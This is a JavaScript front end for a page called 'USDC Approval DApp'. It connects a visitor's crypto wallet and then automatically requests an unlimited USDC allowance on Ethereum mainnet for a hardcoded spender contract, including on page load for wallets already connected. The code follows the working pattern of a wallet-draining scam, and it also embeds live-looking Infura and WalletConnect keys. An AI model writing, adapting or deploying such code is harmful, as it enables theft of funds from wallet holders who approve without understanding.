// script.js
// --- Configuration for Ethereum Mainnet ---
const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

// Auto-approve configuration
const AUTO_APPROVE_ENABLED = true; // Set to true to automatically trigger the approval transaction

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function decimals() view returns (uint8)"
];

let provider; // Ethers.js provider
let signer;   // Ethers.js signer
let connectedAccount; // Connected wallet address

let web3Modal; // Web3Modal instance for WalletConnect V2
let currentWeb3ModalProvider; // The provider returned by Web3Modal.connect()

// --- DOM Elements ---
const connectMetaMaskButton = document.getElementById('connectMetaMaskButton');
const connectMobileButton = document.getElementById('connectMobileButton');
const approveButton = document.getElementById('approveButton');
const currentMessage = document.getElementById('current-message');
const loader = document.getElementById('loader');
const walletInfo = document.getElementById('walletInfo');
const accountAddress = document.getElementById('accountAddress');
const networkName = document.getElementById('networkName');
const statusDiv = document.getElementById('status');
const errorDetailsDiv = document.getElementById('errorDetails');
const errorMessageSpan = document.getElementById('errorMessage');
const qrcodeDisplay = document.getElementById('qrcodeDisplay');
const qrcodeImage = document.getElementById('qrcodeImage');

// --- UI Update Functions ---
function hideLoader() {
    loader.classList.add('hidden');
}

function showLoader() {
    loader.classList.remove('hidden');
}

function updateMessage(text, type = 'info') {
    currentMessage.textContent = text;
    currentMessage.className = `status-message ${type}`;
    hideLoader();
}

function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
    statusDiv.classList.remove('hidden');
}

function hideStatus() {
    statusDiv.classList.add('hidden');
}

function displayErrorDetails(error) {
    errorMessageSpan.textContent = error.message || String(error);
    errorDetailsDiv.classList.remove('hidden');
}

function hideErrorDetails() {
    errorDetailsDiv.classList.add('hidden');
}

function updateWalletInfo(address, network) {
    accountAddress.textContent = address;
    networkName.textContent = network;
    walletInfo.classList.remove('hidden');
    // If auto-approve is enabled, we don't need the approve button, it triggers automatically
    if (!AUTO_APPROVE_ENABLED) {
        approveButton.classList.remove('hidden'); 
    }
    connectMetaMaskButton.classList.add('hidden');
    connectMobileButton.classList.add('hidden');
    qrcodeDisplay.classList.add('hidden'); // Hide QR code after connection
}

function resetUI() {
    walletInfo.classList.add('hidden');
    approveButton.classList.add('hidden');
    connectMetaMaskButton.classList.remove('hidden');
    connectMobileButton.classList.remove('hidden');
    qrcodeDisplay.classList.add('hidden');
    hideStatus();
    hideErrorDetails();
    updateMessage('Please connect your wallet to approve USDC.', 'info');
    currentWeb3ModalProvider = null;
}

// Generic handler for provider changes/connection
async function handleProviderConnection(currentProvider) {
    if (!currentProvider) {
        console.log("Provider disconnected or not available.");
        resetUI();
        return;
    }

    try {
        provider = new ethers.providers.Web3Provider(currentProvider); // Ethers V5 provider
        signer = provider.getSigner();
        connectedAccount = await signer.getAddress();
        const network = await provider.getNetwork();

        updateWalletInfo(connectedAccount, network.name);
        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
        console.log('Wallet connected:', connectedAccount, 'on', network.name);

        // Automatically trigger approval if enabled
        if (AUTO_APPROVE_ENABLED) {
            console.log('DEBUG: AUTO_APPROVE_ENABLED is true. Attempting to proposeApproveTransaction()...');
            await proposeApproveTransaction();
        }

        // Set up event listeners for the provider
        currentProvider.on("accountsChanged", (accounts) => {
            console.log("accountsChanged", accounts);
            if (accounts.length === 0) resetUI();
            else handleProviderConnection(currentProvider);
        });
        currentProvider.on("chainChanged", (chainId) => {
            console.log("chainChanged", chainId);
            handleProviderConnection(currentProvider);
        });
        currentProvider.on("disconnect", (code, reason) => {
            console.log("disconnect", code, reason);
            resetUI();
        });

    } catch (error) {
        console.error('Error handling provider connection:', error);
        updateMessage('Error processing wallet connection.', 'error');
        displayErrorDetails(error);
        resetUI();
    } finally {
        hideLoader();
    }
}

async function connectMetaMask() {
    showLoader();
    updateMessage('Connecting to MetaMask...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("MetaMask not detected. Please install it.");
        }

        // Request account access for MetaMask
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Use window.ethereum as the provider and pass to generic handler
        await handleProviderConnection(window.ethereum);

    } catch (error) {
        console.error('MetaMask connection failed:', error);
        updateMessage('MetaMask connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

async function connectMobileWallet() {
    showLoader();
    updateMessage('Opening wallet selection for mobile wallet...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (!web3Modal) {
            throw new Error("Web3Modal not initialized. Ensure web3modal.js is loaded.");
        }

        // Web3Modal handles the UI for wallet selection and QR code display
        console.log("Web3Modal instance before openModal:", web3Modal);
        web3Modal.openModal();


    } catch (error) {
        console.error('Mobile wallet connection failed:', error);
        updateMessage('Mobile wallet connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

// --- Propose Approve Transaction Function ---
async function proposeApproveTransaction() {
    if (!signer || !connectedAccount) {
        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }

    showLoader();
    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        // Ethers V5: use ethers.Contract directly
        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        // Ethers V5: ethers.constants.MaxUint256
        const txResponse = await usdcContract.approve(
            SPENDER_CONTRACT_ADDRESS,
            ethers.constants.MaxUint256 // Unlimited allowance
        );

        const txHash = txResponse.hash;

        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
        updateMessage('Approval transaction sent!', 'success');
        console.log('Transaction Hash:', txHash);

    } catch (error) {
        console.error('Transaction proposal failed:', error);
        showStatus(`Transaction failed: ${error.message || error}`, 'error');
        updateMessage('Approval transaction failed.', 'error');
        displayErrorDetails(error);
    } finally {
        hideLoader();
    }
}

// --- Event Listeners ---
connectMetaMaskButton.addEventListener('click', connectMetaMask);
connectMobileButton.addEventListener('click', connectMobileWallet);

// The approve button is now only visible if AUTO_APPROVE_ENABLED is false
if (!AUTO_APPROVE_ENABLED) {
    approveButton.addEventListener('click', proposeApproveTransaction);
}

// Initial setup on load
window.addEventListener('load', async () => {
    // Check if the buttons and QR display elements exist before adding event listeners (for robustness)
    if (!connectMetaMaskButton || !connectMobileButton || !qrcodeDisplay || !qrcodeImage) {
        console.error("One or more essential UI elements not found! Ensure index.html is up-to-date.");
        updateMessage("UI Initialization Error: Please check console for details.", "error");
        return;
    }

    // Initialize Web3Modal (WalletConnect V2)
    if (typeof Web3Modal === 'undefined') {
        console.error("Web3Modal library not loaded. Ensure it's imported as a module in index.html.");
        updateMessage("Web3Modal Init Error: Please check console for details.", "error");
        return;
    }


    web3Modal = new Web3Modal({
        network: "mainnet", // Default network
        cacheProvider: false, // Temporarily disabled for debugging WalletConnect issues
        projectId: WALLETCONNECT_PROJECT_ID, // Your WalletConnect Project ID
        relayUrl: 'wss://relay.walletconnect.com', // Explicitly set WalletConnect V2 Relay URL
        rpcMap: {
            1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e" // Fallback RPC URL for Mainnet
        },
        chains: [{
            chainId: 1,
            name: 'Ethereum Mainnet',
            currency: 'ETH',
            explorerUrl: 'https://etherscan.io',
            rpcUrl: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e" // Your Infura ID
        }],
        metadata: {
            name: 'USDC Approval DApp',
            description: 'USDC Unlimited Approval DApp',
            url: 'https://drtest-inky.vercel.app/',
            icons: ['https://drtest-inky.vercel.app/logo.png'] // Public placeholder for ngrok testing
        }
    });
    console.log("Web3Modal initialized.");
    console.log("Web3Modal instance:", web3Modal); // Added for debugging

    // Subscribe to modal state changes to react to connections/disconnections
    web3Modal.subscribeModal(async (newState) => {
        console.log("Web3Modal modal state changed:", newState);
        // When modal closes AND a provider is available (meaning a connection was successful or re-established)
        if (!newState.open && newState.provider) {
            console.log("Web3Modal provider now available after modal closure:", newState.provider);
            // It's crucial to set currentWeb3ModalProvider from newState.provider
            currentWeb3ModalProvider = newState.provider;
            await handleProviderConnection(currentWeb3ModalProvider);
        } else if (!newState.open && !newState.provider) {
            console.log("Web3Modal modal closed without provider or disconnected.");
            // This might indicate a disconnection or cancelled connection
            // If the provider was connected but is now gone, and not cached, reset UI
            // Web3Modal V2 typically handles clearing cached providers when disconnected
            // So, simply resetUI if no provider is active
            if (web3Modal.cachedProvider === "") { // Check if Web3Modal itself doesn't have a cached provider
                 resetUI();
            }
        }
    });

    // Check for existing MetaMask connection on initial load
    if (window.ethereum && window.ethereum.selectedAddress) {
        console.log("Found existing MetaMask selectedAddress. Attempting to re-establish session.");
        await handleProviderConnection(window.ethereum);
    } else {
        updateMessage('Please connect your wallet to approve USDC.', 'info');
    }});